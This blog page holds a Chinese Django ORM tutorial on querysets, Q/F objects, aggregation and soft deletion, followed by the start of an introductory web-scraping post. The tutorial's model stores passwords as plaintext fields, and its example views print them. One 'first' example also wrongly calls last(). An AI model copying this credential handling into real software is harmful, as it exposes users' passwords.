<h3 id="获取查询结果集"><a href="#获取查询结果集" class="headerlink" title="获取查询结果集"></a>获取查询结果集</h3><p>all、filter、exclude、order_by、values、切片</p>
<p>链式调用：person.objects.filter().filter()…..exclude()…</p>
<h4 id="all"><a href="#all" class="headerlink" title="all"></a>all</h4><p>返回所有数据</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">queStudent</span><span class="params">(request)</span>:</span></span><br><span class="line">    students = Student.objects.all()</span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    print("数据:",students,"类型:",type(students))</span></span><br><span class="line"><span class="string">    数据: &lt;QuerySet [&lt;Student: Student object&gt;, 。。。。&gt;</span></span><br><span class="line"><span class="string">    类型: &lt;class 'django.db.models.query.QuerySet'&gt;</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> student <span class="keyword">in</span> students:</span><br><span class="line">        print(<span class="string">"姓名：&#123;0&#125; 密码：&#123;1&#125; "</span>.format(student.s_name,student.s_password))</span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    姓名：Jack 密码：123456789</span></span><br><span class="line"><span class="string">    姓名：Niki 密码：987654321</span></span><br><span class="line"><span class="string">    姓名：Rose 密码：abcdefg</span></span><br><span class="line"><span class="string">    姓名：Bool 密码：poiuytq</span></span><br><span class="line"><span class="string">    姓名：ZJ 密码：oiuytre</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    <span class="keyword">return</span> HttpResponse(<span class="string">"查询成功"</span>)</span><br></pre></td></tr></table></figure>





<h4 id="filter"><a href="#filter" class="headerlink" title="filter"></a>filter</h4><p>过滤操作，将符合条件的对象过滤出来，exclude和filter相反，exclude是过滤出不符合条件的数据</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">queStudent</span><span class="params">(request)</span>:</span></span><br><span class="line">    students = Student.objects.filter(pk__gt=<span class="number">3</span>) <span class="comment"># 主键 &gt;3</span></span><br><span class="line">    <span class="keyword">for</span> student <span class="keyword">in</span> students:</span><br><span class="line">        print(<span class="string">"姓名：&#123;0&#125; 密码：&#123;1&#125; "</span>.format(student.s_name,student.s_password))</span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    姓名：Rose 密码：abcdefg</span></span><br><span class="line"><span class="string">    姓名：Bool 密码：poiuytq</span></span><br><span class="line"><span class="string">    姓名：ZJ 密码：oiuytre</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    <span class="keyword">return</span> HttpResponse(<span class="string">"查询成功"</span>)</span><br></pre></td></tr></table></figure>



<h4 id="order-by"><a href="#order-by" class="headerlink" title="order_by"></a>order_by</h4><p>依照指定的字段名进行排序输出</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">queStudent</span><span class="params">(request)</span>:</span></span><br><span class="line">    students = Student.objects.order_by(<span class="string">'-s_name'</span>) <span class="comment"># 负号表示反序</span></span><br><span class="line">    <span class="keyword">for</span> student <span class="keyword">in</span> students:</span><br><span class="line">        print(<span class="string">"姓名：&#123;0&#125; 密码：&#123;1&#125; "</span>.format(student.s_name,student.s_password))</span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    姓名：ZJ 密码：oiuytre</span></span><br><span class="line"><span class="string">    姓名：Rose 密码：abcdefg</span></span><br><span class="line"><span class="string">    姓名：Niki 密码：987654321</span></span><br><span class="line"><span class="string">    姓名：Jack 密码：123456789</span></span><br><span class="line"><span class="string">    姓名：Bool 密码：poiuytq</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    <span class="keyword">return</span> HttpResponse(<span class="string">"查询成功"</span>)</span><br></pre></td></tr></table></figure>



<h4 id="values"><a href="#values" class="headerlink" title="values"></a>values</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">queStudent</span><span class="params">(request)</span>:</span></span><br><span class="line">    students_all = Student.objects.values()  <span class="comment"># 以字典的形式返回</span></span><br><span class="line">    <span class="keyword">for</span> students <span class="keyword">in</span> students_all: <span class="comment"># 把每个用户字典集中取出来</span></span><br><span class="line">        print(<span class="string">"-------------------------------------"</span>)</span><br><span class="line">        <span class="keyword">for</span> student <span class="keyword">in</span> students.items(): <span class="comment"># 把用户的每个元素从字典中取出来</span></span><br><span class="line">            print(student)</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(<span class="string">"查询成功"</span>)</span><br></pre></td></tr></table></figure>



<h4 id="slice"><a href="#slice" class="headerlink" title="slice"></a>slice</h4><ul>
<li><p>和Python中的切片不太一样</p>
</li>
<li><p>QuerySet[5:15] 获取第5到15条数据，相当于SQL中的Limit和Offset</p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">queStudent</span><span class="params">(request)</span>:</span></span><br><span class="line">    students = Student.objects.all()[<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">for</span> student <span class="keyword">in</span> students:</span><br><span class="line">        print(<span class="string">"姓名：&#123;0&#125; 密码：&#123;1&#125; "</span>.format(student.s_name,student.s_password))</span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    姓名：Jack 密码：123456789</span></span><br><span class="line"><span class="string">    姓名：Niki 密码：987654321</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    <span class="keyword">return</span> HttpResponse(<span class="string">"查询成功"</span>)</span><br></pre></td></tr></table></figure>





<h3 id="获取查询条件的单个对象"><a href="#获取查询条件的单个对象" class="headerlink" title="获取查询条件的单个对象"></a>获取查询条件的单个对象</h3><p>first、last、get、exist</p>
<h4 id="first"><a href="#first" class="headerlink" title="first"></a>first</h4><p>返回查询集中的第一个对象</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">queStudent</span><span class="params">(request)</span>:</span></span><br><span class="line">    student = Student.objects.last()  <span class="comment"># 返回查询的最后个对象</span></span><br><span class="line">    print(student.s_name)</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(<span class="string">"查询成功"</span>)</span><br></pre></td></tr></table></figure>



<h4 id="last"><a href="#last" class="headerlink" title="last"></a>last</h4><p>返回查询集中的最后一个对象</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">queStudent</span><span class="params">(request)</span>:</span></span><br><span class="line">    student = Student.objects.last()  <span class="comment"># 返回查询的第一个对象</span></span><br><span class="line">    print(student.s_name)</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(<span class="string">"查询成功"</span>)</span><br></pre></td></tr></table></figure>





<h4 id="get"><a href="#get" class="headerlink" title="get"></a>get</h4><p>返回一个满足条件的对象，如果没有找到符合条件的对象， 会引发DoesNotExist异常，如果找到多个，会引发模型MultiObjectsReturned异常，可以使用<code>try ... except 模型类.异常...</code>的方式捕获异常。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">queStudent</span><span class="params">(request)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        student = Student.objects.get(pk=<span class="number">11</span>)</span><br><span class="line">        print(student.s_name)</span><br><span class="line">    <span class="keyword">except</span> Student.DoesNotExist:</span><br><span class="line">        print(<span class="string">"用户不存在"</span>)</span><br><span class="line">    <span class="keyword">except</span> Student.MultipleObjectsReturned:</span><br><span class="line">        print(<span class="string">"存在多个用户"</span>)</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(<span class="string">"查询成功"</span>)</span><br></pre></td></tr></table></figure>



<h4 id="exist"><a href="#exist" class="headerlink" title="exist"></a>exist</h4><p>判断查询结果是否存在</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">queStudent</span><span class="params">(request)</span>:</span></span><br><span class="line">    result = Student.objects.filter(s_name=<span class="string">'ZJ'</span>).exists()</span><br><span class="line">    print(result)</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(<span class="string">"查询成功"</span>)</span><br></pre></td></tr></table></figure>



<h3 id="查询条件"><a href="#查询条件" class="headerlink" title="查询条件"></a>查询条件</h3><p>表达式：属性__操作符=临界值</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">- gt  大于</span><br><span class="line">- lt  小于</span><br><span class="line">- gte 大于等于</span><br><span class="line">- lte 小于等于</span><br><span class="line">- <span class="keyword">in</span> 在某一集合中</span><br><span class="line">- contains  	类似于模糊查询like</span><br><span class="line">- startswith  	以xx开始，本质也是like</span><br><span class="line">- endswith 		以xx结束，也是like</span><br><span class="line">- exact  精确等于,相当于 == </span><br><span class="line"></span><br><span class="line">- 前面同时添加i , ignore 忽略</span><br><span class="line">  - iexact  忽略大小写的匹配</span><br><span class="line">  - icontains</span><br><span class="line">  - istartswith</span><br><span class="line">  - iendswith</span><br><span class="line">- isnull 、isnotnull</span><br><span class="line"></span><br><span class="line">- django中查询条件有时区问题</span><br><span class="line">  - 关闭django中自定义的时区</span><br><span class="line">  - 在数据库中创建对应的时区表</span><br></pre></td></tr></table></figure>



<p>示例：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">queStudent</span><span class="params">(request)</span>:</span></span><br><span class="line">    students = Student.objects.filter(pk__gt = <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">for</span> student <span class="keyword">in</span> students:</span><br><span class="line">        print(student.s_name)</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(<span class="string">"查询成功"</span>)</span><br></pre></td></tr></table></figure>





<h3 id="FQ对象"><a href="#FQ对象" class="headerlink" title="FQ对象"></a>FQ对象</h3><p>F对象和Q对象</p>
<p>F对象</p>
<ul>
<li>可以获取我们属性的值</li>
<li>可以实现一个模型不同属性的运算操作</li>
<li>还可以支持算术运算</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 可以使用模型的A属性与B属性进行比较</span></span><br><span class="line"></span><br><span class="line">grades = Grade.objects.filter(ggirlnum__gt=F(<span class="string">'gboynum'</span>) )</span><br><span class="line"></span><br><span class="line"><span class="comment"># F对象支持算数运算</span></span><br><span class="line"></span><br><span class="line">grades = Grade.objects.filter(ggirlnum__gt=F(<span class="string">'gboynum'</span>) +<span class="number">10</span> )</span><br></pre></td></tr></table></figure>







<p>Q对象</p>
<p>过滤器的方法中的关键参数，常用于组合条件</p>
<p>对查询条件进行封装， 封装之后支持逻辑运算</p>
<ul>
<li>与 &amp; and</li>
<li>或  |  or</li>
<li>非  ~  not</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">queStudent</span><span class="params">(request)</span>:</span></span><br><span class="line">    <span class="comment"># 查询主键值在[2,4]之间的用户</span></span><br><span class="line">    students = Student.objects.filter(Q(pk__gte = <span class="number">2</span>) &amp; Q(pk__lte =<span class="number">4</span>))</span><br><span class="line">    <span class="keyword">for</span> student <span class="keyword">in</span> students:</span><br><span class="line">        print(student.s_name)</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(<span class="string">"查询成功"</span>)</span><br></pre></td></tr></table></figure>



<h3 id="聚合函数"><a href="#聚合函数" class="headerlink" title="聚合函数"></a>聚合函数</h3><p>使用aggregate()函数返回聚合函数的值</p>
<p>Avg：平均值</p>
<p>Count：数量</p>
<p>Max：最大</p>
<p>Min：最小</p>
<p>Sum：求和</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">queStudent</span><span class="params">(request)</span>:</span></span><br><span class="line">    result = Student.objects.aggregate(Count(<span class="string">'s_name'</span>))</span><br><span class="line">    print(result)</span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    &#123;'s_name__count': 5&#125;</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    <span class="keyword">return</span> HttpResponse(<span class="string">"查询成功"</span>)</span><br></pre></td></tr></table></figure>





<h3 id="逻辑删除"><a href="#逻辑删除" class="headerlink" title="逻辑删除"></a>逻辑删除</h3><p>对于重要数据都做逻辑删除，不做物理删除，实现方法是定义isDelete属性，类型为BooleanField，默认值为False。</p>
<p>修改数据库表单</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span><span class="params">(models.Model)</span>:</span></span><br><span class="line">    s_name = models.CharField(max_length=<span class="number">32</span>)</span><br><span class="line">    s_password = models.CharField(max_length=<span class="number">32</span>)</span><br><span class="line">    s_grade = models.ForeignKey(Grade)</span><br><span class="line">    is_delete = models.BooleanField(default=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>



<p>进行文件迁移</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python manage.py makemigrations</span><br><span class="line">python manage.py migrate</span><br></pre></td></tr></table></figure>



<p>先查询所有项</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查询函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">queStudent</span><span class="params">(request)</span>:</span></span><br><span class="line">    students = Student.objects.filter(is_delete=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">for</span> student <span class="keyword">in</span> students:</span><br><span class="line">        print(<span class="string">"姓名：&#123;0&#125; 密码：&#123;1&#125; "</span>.format(student.s_name, student.s_password))</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(<span class="string">"查询成功"</span>)</span><br></pre></td></tr></table></figure>

<p>结果</p>
<blockquote>
<p>姓名：Jack 密码：123456789<br>姓名：Niki 密码：987654321<br>姓名：Rose 密码：abcdefg<br>姓名：Bool 密码：poiuytq<br>姓名：ZJ 密码：oiuytre</p>
</blockquote>
<p>删除其中某项</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 实际上是把is_delete字段修改为True，并不是真的删除</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modStudent</span><span class="params">(request)</span>:</span></span><br><span class="line">    student = Student.objects.get(s_name=<span class="string">'ZJ'</span>)</span><br><span class="line">    student.is_delete = <span class="literal">True</span></span><br><span class="line">    student.save()</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(<span class="string">"修改成功！"</span>)</span><br></pre></td></tr></table></figure>



<p>再次查询结果：</p>
<blockquote>
<p>姓名：Jack 密码：123456789<br>姓名：Niki 密码：987654321<br>姓名：Rose 密码：abcdefg<br>姓名：Bool 密码：poiuytq</p>
</blockquote>
<p>这样做可以实现对重要数据不是真的删除，但是有一个缺点，我们每次查询的时候，都需要加上<code>is_delete=False</code>这样一个选项，能不能有什么改进的措施呢？</p>
<p>可以通过自定义Manager实现统一封装，重写get_queryset方法，这样就不需要在查询的时候写<code>filter(is_delete=False)</code></p>
<p>1、修改models.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.db <span class="keyword">import</span> models</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Grade</span><span class="params">(models.Model)</span>:</span></span><br><span class="line">    g_grade = models.CharField(max_length=<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">StudentManager</span><span class="params">(models.Manager)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_queryset</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> super(StudentManager,self).get_queryset().filter(is_delete=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span><span class="params">(models.Model)</span>:</span></span><br><span class="line">    s_name = models.CharField(max_length=<span class="number">32</span>)</span><br><span class="line">    s_password = models.CharField(max_length=<span class="number">32</span>)</span><br><span class="line">    s_grade = models.ForeignKey(Grade)</span><br><span class="line">    is_delete = models.BooleanField(default=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    objects = StudentManager() <span class="comment"># 对Manager的实例Objects的get_qeuryset方法在进行一层封装</span></span><br></pre></td></tr></table></figure>



<p>2、这样查询语句中的is_delete字段就可以去掉了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">queStudent</span><span class="params">(request)</span>:</span></span><br><span class="line">    students = Student.objects.filter()</span><br><span class="line">    <span class="keyword">for</span> student <span class="keyword">in</span> students:</span><br><span class="line">        print(<span class="string">"姓名：&#123;0&#125; 密码：&#123;1&#125; "</span>.format(student.s_name, student.s_password))</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(<span class="string">"查询成功"</span>)</span><br></pre></td></tr></table></figure>



<h3 id="多表查询"><a href="#多表查询" class="headerlink" title="多表查询"></a>多表查询</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">·分类</span><br><span class="line">	·ForeignKey：一对多，将字段定义在多的端中</span><br><span class="line">	·ManyToManyField：多对多，将字段定义在两端中</span><br><span class="line">	·OneToOneField：一对一，将字段定义在任意一端中</span><br><span class="line"></span><br><span class="line">·用一访问多</span><br><span class="line">	·格式</span><br><span class="line">		·对象.模型类小写_set</span><br><span class="line">	·示例</span><br><span class="line">		grade.students_set</span><br><span class="line"></span><br><span class="line">·用一访问一</span><br><span class="line">	·格式</span><br><span class="line">		·对象.模型类小写</span><br><span class="line">	·示例</span><br><span class="line">		·grade.students</span><br><span class="line"></span><br><span class="line">·访问id</span><br><span class="line">	·格式</span><br><span class="line">		·对象.属性_id</span><br><span class="line">	·示例</span><br><span class="line">		·student.s_grade_id</span><br></pre></td></tr></table></figure>







<p>1、通过学生的姓名查询学生所在的班级，使用外键作为连接：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">queStudent</span><span class="params">(request)</span>:</span></span><br><span class="line">    student = Student.objects.get(s_name=<span class="string">'Rose'</span>)</span><br><span class="line">    print(student.s_grade.g_grade) <span class="comment"># Science</span></span><br><span class="line">    <span class="keyword">return</span> HttpResponse(<span class="string">"查询成功"</span>)</span><br></pre></td></tr></table></figure>



<p>2、直接查询</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">queStudent</span><span class="params">(request)</span>:</span></span><br><span class="line">    grade = Grade.objects.get(student__s_name=<span class="string">'Rose'</span>)</span><br><span class="line">    print(grade.g_grade) <span class="comment"># Science</span></span><br><span class="line">    <span class="keyword">return</span> HttpResponse(<span class="string">"查询成功"</span>)</span><br></pre></td></tr></table></figure>



<h2 id="缓存集"><a href="#缓存集" class="headerlink" title="缓存集"></a>缓存集</h2><ul>
<li>filter、exclude、all 都不会真正的去查询数据库</li>
<li>只有我们在迭代结果集，或者获取单个对象属性的时候，它才会去查询数据库</li>
<li>懒查询：为了优化我们结构和查询</li>
</ul>

            
            <p class="more">
                <a href="../../http:/ymlog.cn/2020/03/28/Django(%E4%BA%8C)%E4%B9%8BModels/">阅读剩下更多</a>
            </p>
        </div>
        <div class="post-thumbnail" data-img="">
            <a href="http://ymlog.cn/2020/03/28/Django(%E4%BA%8C)%E4%B9%8BModels/" title="Django——Models">
                
                    <img class="thumbnail" src="../../img/default.png" data-echo="../../img/thumbnail/8.jpg" alt="默认配图" >
                
            </a>
        </div>
    </div>
</article>

    
        <!-- 文章列表 item -->
<article class="post">
    <header>
        <!-- 标签这有且只能显示一个 -->
        
        <a class="cat-link" href="">编程</a>
        
        <!-- 文章标题 -->
        
    <h3 class="post-title">
    	<a href="../../http:/ymlog.cn/2019/10/21/Python%E7%88%AC%E8%99%AB%E5%A4%A7%E7%BA%B2%E6%A6%82%E8%BF%B0/">
    		Python爬虫大纲概述
    	</a>
    </h3>

    </header>
    <p class="post-meta">
        Jelon 发表于
        <time datetime="2019-10-21T04:37:03.000Z">2019-10-21</time>
        &nbsp;&nbsp;
        <span class="post-tags">
            标签：
            
        </span>
    </p>

    <div class="post-content">
        <div class="post-excerpt">
            
                <h1 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h1><p>爬虫的本质是：程序模拟浏览器，对服务器发起访问(requests请求过程)，服务器返回响应(response响应过程)。所以，一个简单的爬虫只有三步：</p>
<ul>
<li>构造URL</li>
<li>对服务器发送请求</li>
<li>输出服务器返回内容</li>
</ul>
<p><img src="https://i.loli.net/2019/10/21/H5xcmP18p32n4Ml.png" alt="爬虫"></p>
<p>这里用一个实例，运行后可以看到输出了百度网页的源码(这里就不演示了)：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="comment"># requests是python爬虫最常用的请求库</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://www.baidu.com'</span> <span class="comment">#1、指名要访问的网站</span></span><br><span class="line"></span><br><span class="line">response = requests.get(url) <span class="comment">#2、使用requests的get方法请求网站信息</span></span><br><span class="line"></span><br><span class="line">print(response.text) <span class="comment">#3、输出响应内容</span></span><br></pre></td></tr></table></figure>

<p>所以，爬虫也都围绕这三步进行。<br>1、构造URL，就是要爬的链接<br>2、发起请求<br>3、解析响应内容</p>
<h1 id="构造URL"><a href="#构造URL" class="headerlink" title="构造URL"></a>构造URL</h1><p>可能有人会问，指定URL这么简单，为什么也要写，这里笔者给出一个实例说明：<br>这是东方财富网的腾讯股票页面，如果我想要爬取这个页面的评价，那么我就需要知道评论的URL。<br><br></p>
<p><img src="https://i.loli.net/2019/10/21/SGNEoJWLYUOI4ce.png" alt="东方财富网腾讯股"></p>
<br>
这个页面有94条评论地址，一共有196个这样的页，也就是我需要知道至少18,424‬个URL我才能把腾讯股票所有的评率全部爬下来，这显然是不现实的。那么我们是如何知道要爬页面的URL的呢？答案是：通过网站的内部逻辑构造URL。
<br>

<p><img src="https://i.loli.net/2019/10/21/Z71H6caJ3X5mRkI.png" alt="评论数"></p>
<br>
通过Chrome开发者选项可以调出如下页面，指定一条评论链接，我们可以看到红圈画出来的内容:`/news,usaapl,880272132.html`
<br>


<p><img src="https://i.loli.net/2019/10/21/wA7Ssiqh6FQRpzr.png" alt="网站结构"></p>
<br>
然后我们再点进去，看看这个站点的真正链接是什么。
<br>


<p><img src="https://i.loli.net/2019/10/21/2yRfnFKUPDvz4kV.png" alt="站点链接"></p>
<p>可以看到，这个站点的真正链接是:</p>
<blockquote>
<p><a href="http://guba.eastmoney.com/news,usaapl,880272132.html" target="_blank" rel="noopener">http://guba.eastmoney.com/news,usaapl,880272132.html</a></p>
</blockquote>
<p>而我们之前找到了<code>/news,usaapl,880272132.html</code>，这个站点的真正链接，就是在这段之前拼接：<code>http://guba.eastmoney.com</code>。</p>
<p>所以，我们只需要把一开始的网站爬下来，然后筛选出类似<code>/news,usaapl,880272132.html</code>这样的内容，然后再把它和<code>http://guba.eastmoney.com</code>拼接，就可以得到当前页面上所有评论的具体地址，这就是地址构造，也就是构造URL。</p>
<h1 id="发起请求"><a href="#发起请求" class="headerlink" title="发起请求"></a>发起请求</h1><p>一个爬虫是否能成功将网页爬下来，完全取决于请求。现在网络上绝大部分的网站都有了反爬机制，能够拦截爬虫。</p>
<p>这里解释一下为什么要有反爬。爬虫抓取网页就相当于用户访问网页，在这期间，浏览器对服务器发起了一次访问。如果爬虫大量的抓取网页，比如在一分钟之内抓取了一万次网页，那么就相当于访问了服务器一万次，这样就会大量的占据服务器的资源，甚至大型分布式爬虫会使服务器崩溃。然而，人类是不可能做到10000次/min的访问量的(其实相当于一分钟内刷新一个网页10000次)。所以，越来越多的网站设计了反爬，将低访问量的人和高访问量的爬虫区别开来，让人能够正常访问，而爬虫则拒之门外。目前主要通过以下方式实现反爬：</p>
<ul>
<li>识别用户的User-Agent</li>
<li>使用Ajax请求</li>
<li>使用JavaScript渲染内容</li>
<li>对IP进行访问控制</li>
<li>对URL进行加密处理</li>
<li>构造复杂的请求头(往往是请求头需要额外添加网站的其他参数，这些参数分布在网站的隐蔽角落，而且几乎毫无逻辑)</li>
</ul>
<h2 id="添加请求头"><a href="#添加请求头" class="headerlink" title="添加请求头"></a>添加请求头</h2><p>这里笔者给出一个豆瓣电影榜的例子，首先用户需要先在浏览器中找到自己浏览器的请求头，具体操作如下：</p>
<ul>
<li>打开浏览器</li>
<li>进入开发者模式，谷歌浏览器是按F12</li>
